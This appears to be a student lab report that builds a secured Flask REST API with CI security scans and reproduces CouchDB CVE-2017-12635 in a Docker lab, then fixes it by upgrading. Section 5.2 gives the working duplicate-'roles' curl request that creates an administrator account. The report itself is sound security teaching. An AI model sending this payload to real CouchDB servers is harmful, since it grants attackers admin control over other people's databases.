# Laboratory Work No. 1

## Secure REST API Development with CI/CD and CVE-2017-12635 Analysis

| Field | Value |
|---|---|
| Laboratory work | Work 1 |
| Variant | CVE-2017-12635 |
| Student surname and name | Guo Ruihao |
| HDU number | 23320309 |
| Repository | <https://github.com/zhangyu7777777/InformationSecurity_23320309> |
| Successful pipeline | <https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39363497176> |

## 1. Purpose

The purpose of this work is to build a Flask REST API with JWT authentication,
SQL injection and XSS protection, automated SAST/SCA checks in GitHub
Actions, and a reproduced and fixed CVE in Docker.

## 2. Project and API

The application is implemented in `app.py` and uses SQLite. Run it with:

```powershell
cd path\to\secure-api
py -3 -m venv .venv
.\.venv\Scripts\python.exe -m pip install -r requirements.txt
.\.venv\Scripts\python.exe app.py
```

The first start creates two test users: `alice / 123456` (admin) and
`bob / 123456` (user).

| Method | Path | Description |
|---|---|---|
| POST | `/auth/login` | Log in and return a JWT |
| GET | `/api/data` | Return data; requires a token |
| POST | `/api/data` | Create data; requires a token |

Log in:

```bat
curl.exe -X POST http://127.0.0.1:5000/auth/login -H "Content-Type: application/json" -d "{\"login\":\"alice\",\"password\":\"123456\"}"
```

Get data (replace `TOKEN` with the returned token):

```bat
curl.exe http://127.0.0.1:5000/api/data -H "Authorization: Bearer TOKEN"
```

Create data:

```bat
curl.exe -X POST http://127.0.0.1:5000/api/data -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d "{\"title\":\"test\",\"body\":\"hello\"}"
```

Access without a token returns `401`.

## 3. Security Measures

- **SQL injection:** every SQL statement uses `?` placeholders, for example
  `SELECT * FROM users WHERE username = ?`. No user input is concatenated
  into SQL.
- **XSS:** titles, body text, and usernames are escaped with `html.escape()`
  before they are returned.
- **Authentication:** passwords are stored as bcrypt hashes; login returns an
  HS256 JWT; both protected endpoints use `@login_required`, which returns
  `401` for a missing or invalid token.

## 4. CI/CD

`.github/workflows/ci.yml` runs on every push:

```text
python -c "import app"
bandit app.py
pip-audit -r requirements.txt
```

Result: Bandit reports no issues and pip-audit reports no known
vulnerabilities. The JSON reports are uploaded as the `security-reports`
artifact.

Pipeline: <https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39363497176>

![SAST and SCA results](screenshots/security-check.png)

![GitHub Actions](screenshots/ci-success.png)

## 5. CVE-2017-12635

### 5.1 Vulnerability

CVE-2017-12635 is a privilege escalation vulnerability in CouchDB before
2.1.1. CouchDB uses an Erlang parser for authorization and a JavaScript
parser for user storage. When a request contains duplicate `roles` keys, the
two parsers see different values, allowing a normal user to create an
administrator account.

### 5.2 Reproduction

```bash
git clone --depth 1 https://github.com/vulhub/vulhub.git
cd vulhub/couchdb/CVE-2017-12635
docker compose up -d
```

If the request returns `404 Database does not exist`, create the system
databases manually:

```bat
curl.exe -X PUT http://admin:password@127.0.0.1:5984/_users
curl.exe -X PUT http://admin:password@127.0.0.1:5984/_replicator
curl.exe -X PUT http://admin:password@127.0.0.1:5984/_global_changes
```

A normal request that tries to set the admin role returns `403`:

```bat
curl.exe -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"password\":\"vulhub\"}"
```

A request with duplicate `roles` keys returns `201`:

```bat
curl.exe -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"vulhub\"}"
```

The new user has the `_admin` role:

```bat
curl.exe -u vulhub:vulhub http://127.0.0.1:5984/_session
```

```json
{"ok":true,"userCtx":{"name":"vulhub","roles":["_admin"]},...}
```

![Vulnerability reproduction](screenshots/cve-before.png)

### 5.3 Root Cause

The root cause is a JSON parser differential. The authorization check reads
the first `roles` value (`["_admin"]`), while the storage layer reads the last
value (`[]`). As a result, the role used by the authorization check differs
from the role saved in the user document.

### 5.4 Fix

Stop the vulnerable environment:

```bash
docker compose down
```

Start CouchDB 2.1.1:

```bash
docker run -d --name couchdb-fixed -p 5985:5984 -e COUCHDB_USER=admin -e COUCHDB_PASSWORD=password couchdb:2.1.1
```

Wait a few seconds, then create the system database:

```bat
curl.exe -X PUT http://admin:password@127.0.0.1:5985/_users
```

The fix is a version upgrade. No Dockerfile or compose file was changed, so
no separate fix folder is required.

### 5.5 Verification

The duplicate-role request still returns `201`, but the session has no admin
role:

```bat
curl.exe -i -X PUT http://127.0.0.1:5985/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"vulhub\"}"
```

```bat
curl.exe -u vulhub:vulhub http://127.0.0.1:5985/_session
```

```json
{"ok":true,"userCtx":{"name":"vulhub","roles":[]},...}
```

Creating a database returns `401`:

```bat
curl.exe -i -u vulhub:vulhub -X PUT http://127.0.0.1:5985/newdb
```

Normal user registration still returns `201`:

```bat
curl.exe -i -X PUT http://127.0.0.1:5985/_users/org.couchdb.user:normaluser -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"normaluser\",\"roles\":[],\"password\":\"normalpass\"}"
```

![Fix verification](screenshots/cve-after.png)
